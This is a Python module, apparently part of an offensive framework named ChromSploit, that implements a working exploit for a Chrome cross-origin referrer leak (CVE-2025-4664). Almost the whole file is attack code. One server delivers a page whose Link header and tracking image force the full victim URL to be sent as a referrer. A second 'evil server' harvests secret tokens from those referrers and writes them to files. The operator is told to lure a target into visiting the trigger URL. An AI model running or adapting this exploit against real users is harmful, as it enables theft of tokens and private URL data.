#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
CVE-2025-4664: Chrome Loader Cross-Origin Data Leak
Fully integrated PoC exploit for ChromSploit Framework

This module implements the Chrome data leak vulnerability that exploits
the Link header referrer policy to leak cross-origin data.
"""

import http.server
import socketserver  
import threading
import time
import urllib.parse
import json
from typing import Dict, Any, List, Optional
from http.server import HTTPServer, BaseHTTPRequestHandler

# ChromSploit framework imports
from core.enhanced_logger import get_logger

# Initialize logger
logger = get_logger()

# Configuration defaults
DEFAULT_CONFIG = {
    'listening_port': 8088,
    'evil_server_port': 8089,
    'target_sensitive_url_param': 'secret_token',
    'kali_ip': '0.0.0.0'
}


class ExploitServerHandler(http.server.SimpleHTTPRequestHandler):
    """Main exploit server that delivers the malicious page"""
    
    def __init__(self, *args, config=None, **kwargs):
        self.config = config or DEFAULT_CONFIG
        super().__init__(*args, **kwargs)
    
    def log_message(self, format, *args):
        """Override to use framework logger"""
        logger.debug(f"[CVE-2025-4664] {format % args}")
    
    def do_GET(self):
        logger.info(f"[CVE-2025-4664] Victim connected from {self.client_address[0]}")
        
        if self.path == "/trigger" or self.path.startswith("/trigger?"):
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            
            # Critical: The Link header with unsafe-url referrer policy
            evil_url = f"http://{self.config['kali_ip']}:{self.config['evil_server_port']}"
            self.send_header("Link", f'<{evil_url}>; rel="preconnect"; referrerpolicy="unsafe-url"')
            
            # Generate exploit HTML
            html_content = self._generate_exploit_html(evil_url)
            
            self.send_header("Content-Length", str(len(html_content)))
            self.end_headers()
            self.wfile.write(html_content.encode('utf-8'))
            
        else:
            self.send_response(404)
            self.end_headers()
            self.wfile.write(b"Not Found")
    
    def _generate_exploit_html(self, evil_server_url: str) -> str:
        """Generate the malicious HTML that triggers the data leak"""
        sensitive_param = self.config['target_sensitive_url_param']
        
        return f"""<!DOCTYPE html>
<html>
<head>
    <title>CVE-2025-4664 PoC</title>
    <!-- Link header forces unsafe-url referrer policy -->
    <link rel="preconnect" href="{evil_server_url}" referrerpolicy="unsafe-url">
</head>
<body>
    <h1>Loading content...</h1>
    <p>This page demonstrates CVE-2025-4664.</p>
    <p>Imagine this is victim.com/user_profile?{sensitive_param}=THIS_IS_VERY_SECRET_DATA_12345</p>
    
    <!-- This image request's referrer will be leaked to the evil_server -->
    <img src="{evil_server_url}/tracker.gif" width="1" height="1">
    
    <p>If the exploit worked, your full URL (including parameters) was sent to the attacker's server.</p>
    
    <script>
        // Optional: Simulate navigation if no sensitive parameter present
        if (!window.location.search.includes('{sensitive_param}')) {{
            // Simulate navigating to a page with a sensitive token
            // window.location.href = window.location.pathname + '?{sensitive_param}=SIMULATED_SENSITIVE_TOKEN_ABC123';
        }}
    </script>
</body>
</html>"""
    
    def do_HEAD(self):
        """Handle HEAD requests"""
        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.end_headers()


class EvilServerHandler(http.server.SimpleHTTPRequestHandler):
    """Evil server that collects leaked referrer data"""
    
    def __init__(self, *args, config=None, leaked_data=None, **kwargs):
        self.config = config or DEFAULT_CONFIG
        self.leaked_data = leaked_data if leaked_data is not None else []
        super().__init__(*args, **kwargs)
    
    def log_message(self, format, *args):
        """Override to use framework logger"""
        logger.debug(f"[CVE-2025-4664 EVIL] {format % args}")
    
    def do_GET(self):
        referer = self.headers.get('Referer')
        logger.info(f"[CVE-2025-4664 EVIL SERVER] Received request for: {self.path}")
        
        if referer:
            logger.warning(f"[CVE-2025-4664 EVIL SERVER] LEAKED REFERRER: {referer}")
            
            # Check for sensitive parameter in referrer
            sensitive_param = self.config['target_sensitive_url_param']
            if sensitive_param in referer:
                logger.critical(f"[CVE-2025-4664 EVIL SERVER] !!! SENSITIVE DATA FOUND IN REFERRER: {referer} !!!")
                
                # Extract the token value
                parsed_url = urllib.parse.urlparse(referer)
                params = urllib.parse.parse_qs(parsed_url.query)
                token_value = params.get(sensitive_param, [''])[0]
                
                # Store leaked data
                leak_info = {
                    'timestamp': time.time(),
                    'client_ip': self.client_address[0],
                    'referer': referer,
                    'token': token_value,
                    'user_agent': self.headers.get('User-Agent', '')
                }
                self.leaked_data.append(leak_info)
                
                # Save to file
                self._save_leaked_data(leak_info)
        else:
            logger.info("[CVE-2025-4664 EVIL SERVER] No Referer header received.")
        
        # Serve response
        self.send_response(200)
        self.send_header("Content-type", "image/gif")
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()
        
        # 1x1 transparent GIF
        gif_data = b'GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;'
        self.wfile.write(gif_data)
    
    def _save_leaked_data(self, leak_info: dict):
        """Save leaked data to file"""
        try:
            timestamp = int(time.time())
            filename = f"/tmp/cve_2025_4664_leak_{timestamp}.json"
            with open(filename, 'w') as f:
                json.dump(leak_info, f, indent=2)
            logger.info(f"[CVE-2025-4664] Leaked data saved to: {filename}")
        except Exception as e:
            logger.error(f"[CVE-2025-4664] Error saving leak: {e}")


class CVE2025_4664_Exploit:
    """Main exploit class for CVE-2025-4664"""
    
    def __init__(self):
        self.name = "CVE-2025-4664"
        self.description = "Chrome Loader Cross-Origin Data Leak via Link Header and Referrer Policy"
        self.requirements = ["Chrome version prior to 136.0.7103.113 (Windows/Linux)"]
        self.logger = logger
        self.config = DEFAULT_CONFIG.copy()
        self.exploit_server = None
        self.evil_server = None
        self.leaked_data = []
        self._server_threads = []
    
    def check_vulnerable(self, target_info: Dict[str, Any]) -> bool:
        """Check if target is vulnerable"""
        browser_name = target_info.get("browser_name", "").lower()
        
        if "chrome" not in browser_name:
            self.logger.info(f"[{self.name}] Target is not Chrome: {browser_name}")
            return False
        
        # Simple check - in real scenario would parse version properly
        self.logger.info(f"[{self.name}] Target appears to be Chrome. Version check needed for actual vulnerability.")
        return True
    
    def generate_payload(self, options: Dict[str, Any] = None) -> Dict[str, Any]:
        """Generate payload configuration"""
        if options:
            self.config.update(options)
        
        # Generate URLs
        trigger_url = f"http://{self.config['kali_ip']}:{self.config['listening_port']}/trigger"
        evil_url = f"http://{self.config['kali_ip']}:{self.config['evil_server_port']}"
        
        # Add sensitive parameter to demo URL
        demo_url = f"{trigger_url}?{self.config['target_sensitive_url_param']}=EXPLOIT_FRAMEWORK_TEST_TOKEN"
        
        payload_details = {
            "trigger_url": demo_url,
            "description": f"Visit the trigger_url in a vulnerable Chrome browser. The full URL, including '{self.config['target_sensitive_url_param']}', will be logged by the server at {evil_url}.",
            "evil_server_port": self.config['evil_server_port'],
            "exploit_server_port": self.config['listening_port']
        }
        
        self.logger.info(f"[{self.name}] Payload generated: {payload_details}")
        return payload_details
    
    def execute(self, target: Dict[str, Any] = None, payload_options: Dict[str, Any] = None) -> Dict[str, Any]:
        """Execute the exploit"""
        self.logger.info(f"[{self.name}] Starting PoC execution...")
        
        if payload_options:
            self.config.update(payload_options)
        
        try:
            # Start evil server
            self._start_evil_server()
            
            # Start exploit server
            self._start_exploit_server()
            
            # Generate payload info
            payload_info = self.generate_payload()
            
            self.logger.critical(f"[{self.name}] PoC Servers are running.")
            self.logger.critical(f"[{self.name}] Evil (Referrer Logging) Server on port {self.config['evil_server_port']}")
            self.logger.critical(f"[{self.name}] Exploit (Trigger) Server on port {self.config['listening_port']}")
            self.logger.critical(f"[{self.name}] Ask the target to visit: {payload_info['trigger_url']}")
            self.logger.info(f"[{self.name}] Servers will run until manually stopped.")
            
            return {
                "status": "success",
                "message": "Servers launched. Manual interaction required.",
                "details": payload_info
            }
            
        except Exception as e:
            self.logger.error(f"[{self.name}] Execution failed: {e}")
            self.cleanup()
            return {
                "status": "error",
                "message": str(e),
                "details": None
            }
    
    def _start_evil_server(self):
        """Start the evil server that collects leaked data"""
        # Create handler with config and shared data
        handler = lambda *args, **kwargs: EvilServerHandler(
            *args, 
            config=self.config,
            leaked_data=self.leaked_data,
            **kwargs
        )
        
        self.evil_server = socketserver.TCPServer(
            ("", self.config['evil_server_port']),
            handler
        )
        
        evil_thread = threading.Thread(target=self.evil_server.serve_forever, daemon=True)
        evil_thread.start()
        self._server_threads.append(evil_thread)
        
        self.logger.info(f"[{self.name}] Evil server started on port {self.config['evil_server_port']}")
    
    def _start_exploit_server(self):
        """Start the main exploit delivery server"""
        # Create handler with config
        handler = lambda *args, **kwargs: ExploitServerHandler(
            *args,
            config=self.config,
            **kwargs
        )
        
        self.exploit_server = socketserver.TCPServer(
            ("", self.config['listening_port']),
            handler
        )
        
        exploit_thread = threading.Thread(target=self.exploit_server.serve_forever, daemon=True)
        exploit_thread.start()
        self._server_threads.append(exploit_thread)
        
        self.logger.info(f"[{self.name}] Exploit server started on port {self.config['listening_port']}")
    
    def cleanup(self):
        """Stop servers and clean up"""
        self.logger.info(f"[{self.name}] Shutting down servers...")
        
        if self.exploit_server:
            self.exploit_server.shutdown()
            self.exploit_server.server_close()
            
        if self.evil_server:
            self.evil_server.shutdown()
            self.evil_server.server_close()
        
        # Wait for threads
        for thread in self._server_threads:
            if thread.is_alive():
                thread.join(timeout=2)
        
        self._server_threads.clear()
        self.logger.info(f"[{self.name}] Cleanup completed")
    
    def get_leaked_data(self) -> List[Dict]:
        """Return any leaked data collected"""
        return self.leaked_data


# Framework integration function
def execute_exploit(parameters: Dict[str, Any]) -> Dict[str, Any]:
    """Execute CVE-2025-4664 exploit with given parameters
    
    This function is called by the ChromSploit framework's exploit chain system.
    
    Args:
        parameters: Dictionary containing:
            - target_url: Target URL (optional)
            - listening_port: Port for exploit server (default: 8088)
            - evil_server_port: Port for evil server (default: 8089)
            - target_sensitive_url_param: Parameter to look for (default: secret_token)
            - kali_ip: IP to bind servers to (default: 0.0.0.0)
    
    Returns:
        Dictionary with execution status and details
    """
    exploit = CVE2025_4664_Exploit()
    
    # Extract target info if provided
    target_info = {
        "browser_name": parameters.get("browser", "Chrome"),
        "browser_version": parameters.get("version", "135.0.0.0")
    }
    
    # Check vulnerability
    if exploit.check_vulnerable(target_info):
        logger.info(f"Target is potentially vulnerable to {exploit.name}.")
        
        # Execute with provided options
        result = exploit.execute(target=target_info, payload_options=parameters)
        
        # Keep servers running if successful
        if result["status"] == "success":
            # In a real framework integration, we'd return control but keep servers running
            # For this PoC, we'll just return the result
            pass
        
        return result
    else:
        logger.info(f"Target does not appear vulnerable to {exploit.name}.")
        return {
            "status": "error",
            "message": "Target not vulnerable",
            "details": None
        }


# Standalone test
if __name__ == "__main__":
    # Test configuration
    test_params = {
        "browser": "Chrome",
        "version": "135.0.0.0",
        "listening_port": 8088,
        "evil_server_port": 8089,
        "target_sensitive_url_param": "api_key"
    }
    
    print("\n=== CVE-2025-4664 PoC Test ===")
    print("Starting exploit servers...")
    
    result = execute_exploit(test_params)
    
    if result["status"] == "success":
        print("\nServers are running!")
        print(f"Visit: {result['details']['trigger_url']}")
        print("\nPress Ctrl+C to stop...")
        
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            print("\nStopping servers...")
            # Note: In real integration, cleanup would be handled by framework
    else:
        print(f"Error: {result['message']}")